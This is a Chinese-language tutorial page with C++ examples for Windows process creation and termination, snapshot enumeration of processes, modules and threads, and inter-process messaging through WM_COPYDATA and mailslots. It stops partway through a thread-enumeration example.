进程  模块  线程的遍历（非常重要的操作）</p><p>  方法有很多 我们这里使用的是创建快照的方式：CreateToolHelp32Snapshot。</p><p>  需要知道的几点：</p><p>  a.  进程是操作系统管理的，遍历的时候，能够遍历出系统中的所有进程的信息：进程名，路径，进程ID</p><p>​     遍历进程的用处：通常来说我们都是知道进程名，然后去找到ID（ID每一次程序运行的时候都是不一样的），我们如果要操作进程，就需要使用OpenProcess函数得到它的句柄，OpenProcess这个函数，就是根据进程ID得到句柄的。</p><p>  b.  模块是属于某一个进程的，所以我们遍历模块的时候，需要指定遍历的是哪一个进程的模块。</p><p>​     能够遍历出模块的信息为：模块名，模块的起始虚拟地址（加载基址）</p><p>​     遍历模块的用处：a 可以知道一个程序都加载了哪些DLL，监测DLL注入   b 分析DLL中的PE文件信息，可以为我们分析一个程序提供依据。</p><p>  c.  线程虽然也是属于某一个进程的，但是其管理是操作系统统一管理的，所以我们遍历的时候，也是遍历出操作系统中的所有线程。需要自己去过滤然后，得到某一个进程的线程。</p><p>​     线程遍历，能够得到的信息有：线程ID，所属进程的ID。</p><p>​     遍历线程的用处：可以得到进程中每一个线程的信息。可以操作这些线程，比如挂起，终止等等。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><table><thead><tr><th>WinExec</th><th>可以创建进程</th></tr></thead><tbody><tr><td>ShellExecute</td><td>可以创建一个进程，打印一个文件，浏览一个文件夹</td></tr><tr><td>system</td><td>也能够以控制台命令的方式打开一个进程</td></tr><tr><td>CreateProcess</td><td>创建进程</td></tr><tr><td>OpenProcess</td><td>打开进程</td></tr><tr><td>ExitProcess</td><td>退出本进程</td></tr><tr><td>TerminateProcess</td><td>结束其它进程</td></tr></tbody></table><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><p>1使用宏加载想要的进程#define PATH2 L”D:\Program Files (x86)\Tencent\QQ\Bin\QQScLauncher.exe”</p><p>2使用结构体PROCESS_INFORMATION定义加载进程信息的缓冲区</p><p>3使用CreateProcess函数创建进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATH2 <span class="meta-string">L&quot;D:\\Program Files (x86)\\Tencent\\QQ\\Bin\\QQScLauncher.exe&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFO si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">CreateProcess(</span><br><span class="line">PATH2,   <span class="comment">//路径</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//命令行参数</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//进程安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,   <span class="comment">//线程安全属性</span></span><br><span class="line">FALSE,  <span class="comment">//是否继承句柄</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//创建方式</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//环境</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//当前的运行目录</span></span><br><span class="line">&amp;si,     <span class="comment">//启动信息</span></span><br><span class="line">&amp;pi      <span class="comment">//进程信息</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结束一个进程"><a href="#结束一个进程" class="headerlink" title="结束一个进程"></a>结束一个进程</h3><p>使用该进程PID打开进程从而获取到进程句柄</p><p>使用TerminateProcess函数结束进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 打开进程，得到句柄</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, <span class="number">5312</span>);</span><br><span class="line"><span class="comment">//2. 终结进程</span></span><br><span class="line">TerminateProcess(hProcess, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程与模块"><a href="#进程与模块" class="headerlink" title="进程与模块"></a>进程与模块</h2><table><thead><tr><th>CreateToolhelp32Snapshot</th><th>可以分别创建进程，线程，进程模块进程堆的快照</th></tr></thead><tbody><tr><td>Process32First</td><td>用来首次调用，获得第一个进程信息</td></tr><tr><td>Process32Next</td><td>以后的调用由它来完成，不断的获取进程信息</td></tr><tr><td>Module32First</td><td>用来首次调用，获得第一个模块信息</td></tr><tr><td>Module32Next</td><td>以后的调用由它来完成，不断的获取模块信息</td></tr><tr><td>Thread32First</td><td>用来首次调用，获得第一个线程信息</td></tr><tr><td>Thread32Next</td><td>以后的调用由它来完成，不断地获取线程信息</td></tr></tbody></table><p>创建快照</p><p>WIndows提供了一组快照的API，使用前需要包含TIHelp32.h头文件，这一组API</p><p>​    能够给当前系统中所有进程拍一个快照，能够获取所有进程的一些基本信息</p><p>​    能够当前系统中的线程拍一个快照</p><p>​    能够给某一个进程拍模块快照</p><p>​    能够给某一个进程拍堆快照</p><h3 id="进程的遍历"><a href="#进程的遍历" class="headerlink" title="进程的遍历"></a>进程的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp =  CreateToolhelp32Snapshot(</span><br><span class="line">TH32CS_SNAPPROCESS,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">PROCESSENTRY32 pe = &#123;<span class="keyword">sizeof</span>(PROCESSENTRY32)&#125;;</span><br><span class="line"><span class="keyword">if</span> (Process32First(hToolHelp, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:%S\n&quot;</span>, pe.th32ProcessID, pe.szExeFile);</span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hToolHelp, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模块的遍历"><a href="#模块的遍历" class="headerlink" title="模块的遍历"></a>模块的遍历</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 得到快照的句柄</span></span><br><span class="line">HANDLE hToolHelp = CreateToolhelp32Snapshot(</span><br><span class="line">TH32CS_SNAPMODULE,</span><br><span class="line"><span class="number">25076</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2. 获取第一个结点的信息</span></span><br><span class="line">MODULEENTRY32 me = &#123; <span class="keyword">sizeof</span>(MODULEENTRY32) &#125;;</span><br><span class="line"><span class="keyword">if</span> (Module32First(hToolHelp, &amp;me))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//pe.szExeFile;//进程名</span></span><br><span class="line"><span class="comment">//pe.th32ProcessID;//ID</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;模块名：%S  加载基址：%p\n&quot;</span>, me.szModule, me.modBaseAddr);</span><br><span class="line">&#125; <span class="keyword">while</span> (Module32Next(hToolHelp, &amp;me));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h2><h3 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h3><p>COPYDATASTRUCT发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HWND hWnd = (HWND)<span class="number">0x0003037E</span>;</span><br><span class="line"></span><br><span class="line">COPYDATASTRUCT cds = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>] = &#123; <span class="string">&quot;hahahahahahahahlou  world&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">cds.dwData = <span class="number">200</span>;<span class="comment">//随便写，写什么发什么</span></span><br><span class="line">cds.lpData = buf;</span><br><span class="line">cds.cbData = <span class="number">100</span>;</span><br><span class="line">SendMessage(hWnd, WM_COPYDATA, <span class="number">0</span>, (LPARAM)&amp;cds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>邮槽发送</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 打开邮槽对象</span></span><br><span class="line">HANDLE hFile = CreateFile(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>, <span class="comment">// 邮槽名称</span></span><br><span class="line">GENERIC_WRITE,              <span class="comment">// 读写属性</span></span><br><span class="line">FILE_SHARE_READ,            <span class="comment">// 共享属性</span></span><br><span class="line"><span class="literal">NULL</span>,                       <span class="comment">// 安全属性</span></span><br><span class="line">OPEN_EXISTING,              <span class="comment">// 打开方式</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,      <span class="comment">// 标志位</span></span><br><span class="line"><span class="literal">NULL</span>);                      <span class="comment">// 文件模板（默认留空）</span></span><br><span class="line"><span class="comment">// 2. 向mailslot写入</span></span><br><span class="line">DWORD  dwWritten;</span><br><span class="line">LPSTR  lpMessage = (LPSTR)<span class="string">&quot;邮槽测试消息！&quot;</span>;</span><br><span class="line">DWORD  dwMegLen = <span class="built_in">strlen</span>(lpMessage) + <span class="keyword">sizeof</span>(CHAR);</span><br><span class="line">WriteFile(hFile, lpMessage, dwMegLen, &amp;dwWritten, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 3. 结束</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;已经向邮槽写入信息！\n&quot;</span>);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接收消息"><a href="#接收消息" class="headerlink" title="接收消息"></a>接收消息</h3><p>COPYDATA接收只需在回调函数的WM_COPYDATA消息响应定义接收的结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COPYDATA:</span><br><span class="line">&#123;</span><br><span class="line">PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;</span><br><span class="line">MessageBoxA(<span class="number">0</span>, (<span class="keyword">char</span>*)(pcds-&gt;lpData), <span class="string">&quot;提示&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 创建邮槽对象</span></span><br><span class="line">HANDLE hSlot = CreateMailslot(</span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>,    <span class="comment">// 邮槽名</span></span><br><span class="line"><span class="number">0</span>,         <span class="comment">// 不限制消息大小 </span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,         <span class="comment">// 无超时 </span></span><br><span class="line">(LPSECURITY_ATTRIBUTES)<span class="literal">NULL</span>    <span class="comment">// 安全属性</span></span><br><span class="line">); </span><br><span class="line"><span class="comment">// 2. 循环读取邮槽信息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 2.1 获取邮槽消息数量</span></span><br><span class="line">DWORD dwMsgCount = <span class="number">0</span>, dwMsgSize = <span class="number">0</span>;</span><br><span class="line">GetMailslotInfo(     <span class="comment">/* 获取邮槽信息 */</span></span><br><span class="line">hSlot,           <span class="comment">// 邮槽句柄 </span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>,<span class="comment">// 无最大消息限制</span></span><br><span class="line">&amp;dwMsgSize,      <span class="comment">// 下一条消息的大小</span></span><br><span class="line">&amp;dwMsgCount,     <span class="comment">// 消息的数量</span></span><br><span class="line">(LPDWORD)<span class="literal">NULL</span>);<span class="comment">// 无时限</span></span><br><span class="line"><span class="keyword">if</span> (dwMsgSize == MAILSLOT_NO_MESSAGE) &#123;</span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="comment">// 2.2 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="keyword">while</span> (dwMsgCount)</span><br><span class="line">&#123;</span><br><span class="line">PBYTE lpBuffer;</span><br><span class="line">lpBuffer = <span class="keyword">new</span> BYTE[dwMsgSize + <span class="number">0x10</span>];</span><br><span class="line"><span class="comment">// 读取邮槽中的信息</span></span><br><span class="line">DWORD dwRet;</span><br><span class="line">ZeroMemory(lpBuffer, dwMsgSize);</span><br><span class="line"><span class="keyword">if</span> (!ReadFile(hSlot, lpBuffer, dwMsgSize, &amp;dwRet, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile函数执行失败，错误码：%d.\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;邮槽的内容: %s\n&quot;</span>, lpBuffer);</span><br><span class="line"><span class="comment">// 计算剩余的消息数</span></span><br><span class="line">GetMailslotInfo(hSlot, (LPDWORD)<span class="literal">NULL</span>, &amp;dwMsgSize, &amp;dwMsgCount, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="八，线程"><a href="#八，线程" class="headerlink" title="八，线程"></a>八，线程</h1><h2 id="线程创建"><a href="#线程创建" class="headerlink" title="线程创建"></a>线程创建</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是子线程,%s\n&quot;</span>, lpThreadParameter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是主线程\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程信号"><a href="#线程信号" class="headerlink" title="线程信号"></a>线程信号</h2><p>WaitForSingleObject(hThread,-1 ); //该函数表示信号，参数一为被创建的线程名，参数二为一直等到有信号的状态，意思是等待被创建线程结束</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_关于线程的信号.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n&lt;<span class="number">100000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line"><span class="comment">//2 等到线程结束</span></span><br><span class="line">WaitForSingleObject(</span><br><span class="line">hThread,</span><br><span class="line"><span class="number">-1</span>      <span class="comment">//一直等到有信号的状态</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程遍历"><a href="#线程遍历" class="headerlink" title="线程遍历"></a>线程遍历</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =               <span class="comment">//参数一为一个线程的宏，遍历进程就写进程的宏，模块就写模块的宏</span></span><br><span class="line">CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span 